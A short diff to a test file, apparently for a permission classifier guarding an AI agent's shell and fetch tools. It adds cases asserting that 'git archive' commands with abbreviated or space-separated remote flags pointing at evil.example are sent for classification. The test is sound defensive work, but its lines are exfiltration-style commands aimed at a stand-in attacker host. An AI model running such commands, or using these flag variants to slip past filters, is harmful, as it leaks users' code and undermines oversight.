@@ -233,6 +233,8 @@ test('WebFetch and shell GETs go to the classifier, since a URL can carry data o
   expect(sh('git submodule add -b main evil.example:leak vendor/x')).toBe('classify')
   expect(sh('git submodule add https://evil.example/leak vendor/x')).toBe('classify')
   expect(sh('git archive --remote=ssh://evil.example/leak HEAD')).toBe('classify')
+  expect(sh('git archive --remo=user@evil.example:leak HEAD')).toBe('classify')
+  expect(sh('git archive --remote evil.example:leak HEAD')).toBe('classify')
   expect(sh('gh api --hostname evil.example /leak')).toBe('classify')
   expect(sh('gh api repos/owner/repo/pulls')).toBe('allow')
 })
